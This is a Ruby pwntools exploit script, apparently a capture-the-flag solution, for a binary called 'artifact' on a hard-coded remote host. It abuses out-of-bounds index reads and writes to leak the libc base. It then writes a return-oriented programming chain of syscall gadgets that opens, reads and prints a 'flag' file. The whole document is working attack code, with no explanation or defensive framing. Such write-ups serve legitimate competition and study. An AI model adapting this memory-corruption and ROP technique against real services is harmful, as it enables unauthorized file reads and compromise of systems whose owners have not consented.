#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '52.192.178.153', 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'artifact'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pt;z.recvuntil("Choice?\n"); end

def write(idx, val)
  pt
  z.puts 2
  z.recvuntil('dx?')
  z.puts idx
  z.recvuntil("number:")
  z.puts val
end

def read(idx)
  pt
  z.puts 1
  z.recvuntil('dx?')
  z.puts idx
  z.recvuntil('is: ')
  z.gets.to_i
end

libc = read(203) - 0x203f1
log.info("libc @ #{libc.hex}")
h.offset(libc)

pop_rax = 0x000000000003a998 + libc
pop_rdi = 0x000000000001fd7a + libc
pop_rdx_rsi = 0x0000000000116d69 + libc
syscall = 0x00000000000bc765 + libc
buf = libc + 0x3c1800
rop = [
  # read(0, buf, 5)
  pop_rax, 0,
  pop_rdi, 0,
  pop_rdx_rsi, 5, buf,
  syscall,

  # open(buf, 0, 2) = 3
  pop_rax, 2,
  pop_rdi, buf,
  pop_rdx_rsi, 2, 0,
  syscall,

  # read(3, buf, 100)
  pop_rax, 0,
  pop_rdi, (@local ? 6 : 3),
  pop_rdx_rsi, 100, buf,
  syscall,

  # write(1, buf, 100)
  pop_rax, 1,
  pop_rdi, 1,
  pop_rdx_rsi, 100, buf,
  syscall
]
rop.each_with_index { |v, i| write(i + 203, v) }

pt
z.puts 3

sleep(1)

z.write("flag\x00")
z.interact
